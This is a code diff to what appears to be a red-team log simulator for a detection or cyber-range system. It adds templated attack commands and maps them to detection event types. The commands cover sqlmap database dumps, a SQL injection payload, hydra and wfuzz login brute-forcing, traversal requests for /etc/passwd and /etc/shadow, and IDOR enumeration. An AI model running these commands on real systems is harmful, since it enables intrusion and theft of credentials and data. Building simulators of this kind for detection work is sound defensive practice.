@@ -26,7 +26,7 @@ from core.event_bus import event_bus
 
 logger = logging.getLogger(__name__)
 
-TARGET_IP = "192.168.1.100"
+TARGET_IP = "172.25.8.172"
 
 # ---------------------------------------------------------------------------
 # Simulated Red-agent log templates
@@ -46,8 +46,24 @@ RED_LOG_TEMPLATES: List[Tuple[str, str]] = [
     ("msfconsole -x 'use exploit/multi/handler; set LHOST {target}; run'", "exploit"),
     ("python3 exploit_{service}.py --target {target} --port {port}", "exploit"),
     ("hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} {service}", "exploit"),
-    ("sqlmap -u http://{target}/ --dbs --level=5", "exploit"),
     ("./exploit.sh --rhost {target} --rport {port} --payload reverse_shell", "exploit"),
+    # SQL injection attacks on Flask /search endpoint → sql_injection
+    ("sqlmap -u http://{target}:5000/search?q=test --dbs --level=5 --risk=3", "sql_injection"),
+    ("sqlmap -u http://{target}:5000/search?q=Widget --batch --dump", "sql_injection"),
+    ("curl 'http://{target}:5000/search?q=%27+OR+1%3D1--'", "sql_injection"),
+    ("python3 sqli_exploit.py --url http://{target}:5000/search --param q", "sql_injection"),
+    # Credential brute-force on Flask /login → credential_attack
+    ("hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:username=^USER^&password=^PASS^:Invalid'", "credential_attack"),
+    ("python3 brute_login.py --url http://{target}:5000/login --wordlist rockyou.txt", "credential_attack"),
+    ("curl -X POST http://{target}:5000/login -d 'username=admin&password=admin123'", "credential_attack"),
+    ("wfuzz -z file,passwords.txt -d 'username=admin&password=FUZZ' http://{target}:5000/login", "credential_attack"),
+    # Directory traversal on Flask /profile → directory_traversal
+    ("curl 'http://{target}:5000/profile?id=../../etc/passwd'", "directory_traversal"),
+    ("curl 'http://{target}:5000/profile?id=....//....//etc/shadow'", "directory_traversal"),
+    ("dotdotpwn -m http -h {target} -x 5000 -f /etc/passwd -k root", "directory_traversal"),
+    # IDOR on Flask /profile → idor
+    ("python3 idor_enum.py --url http://{target}:5000/profile --param id --range 1-1000", "idor"),
+    ("curl 'http://{target}:5000/profile?id=2' -H 'Cookie: session=user1_token'", "idor"),
 ]
 
 # Signature category → event type
@@ -55,6 +71,10 @@ SIGNATURE_TO_EVENT = {
     "nmap": "port_scanned",
     "cve_lookup": "cve_detected",
     "exploit": "exploit_attempted",
+    "sql_injection": "sql_injection_attempted",
+    "credential_attack": "credential_attack_detected",
+    "directory_traversal": "directory_traversal_attempted",
+    "idor": "idor_attempted",
 }
 
 # Regex to extract CVE IDs from log lines
@@ -67,6 +87,7 @@ PORT_SERVICE_MAP = {
     80: "http",
     443: "https",
     3306: "mysql",
+    5000: "flask",
     8080: "http",
     5432: "postgresql",
 }
